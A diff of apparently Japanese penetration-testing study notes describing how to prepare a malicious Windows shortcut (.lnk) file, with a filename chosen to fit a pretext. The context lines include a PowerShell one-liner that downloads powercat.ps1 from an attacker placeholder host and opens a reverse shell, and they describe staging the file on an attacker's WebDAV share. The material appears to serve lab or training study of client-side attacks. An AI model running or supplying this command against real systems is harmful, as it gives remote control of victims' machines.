@@ -127,14 +127,14 @@ $$ライブラリファイルをダブルクリックした画面$$
 
 $$実行後のライブラリファイルの中身が変わっている$$
 
-## 第3段階：.lnkファイルの準備
+## 第3段階：ショートカットファイル（.lnk）ファイルの準備
 
 1. Windowsデスクトップで右クリック → 新規作成 → ショートカットの作成で以下のコマンドを入力して保存する（ファイル名はPretextに沿ったものにする。例：`automatic_configuration`）
 ```powershell
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[AttackerIP]:[Port]/powercat.ps1');powercat -c [AttackerIP] -p [ListenerPort] -e powershell"
 ```
 
-2. 完成した `.lnk` ファイルを攻撃者のKaliマシンのwebdavディレクトリ に配置する。
+2. 完成した `.lnk` ファイルを攻撃者のKaliマシンのwebdavディレクトリ に配置する
 
 ![](../../画像ファイル/Pasted%20image%2020250519074203.png)
 
